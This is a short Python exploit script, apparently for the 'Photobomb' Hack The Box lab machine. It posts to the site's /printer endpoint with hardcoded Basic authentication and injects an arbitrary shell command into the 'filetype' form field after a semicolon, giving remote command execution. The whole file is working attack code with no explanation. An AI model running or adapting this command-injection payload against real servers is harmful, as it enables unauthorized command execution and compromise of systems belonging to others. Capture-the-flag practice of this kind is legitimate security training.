import requests
import argparse


parser = argparse.ArgumentParser(description='Execute commands', epilog='Usage example: python script.py "sleep 5"')
parser.add_argument('command')
args = vars(parser.parse_args())

print("[+] Excuting command -> " + args['command'])
url = "http://photobomb.htb/printer"
headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://photobomb.htb", "Authorization": "Basic cEgwdDA6YjBNYiE=", "Connection": "close", "Referer": "http://photobomb.htb/printer", "Upgrade-Insecure-Requests": "1"}
data = {"photo": "almas-salakhov-VK7TCqcZTlw-unsplash.jpg", "filetype": "jpg;" + args['command'], "dimensions": "600x400"}
r = requests.post(url, headers=headers, data=data)
print("[+] Finished")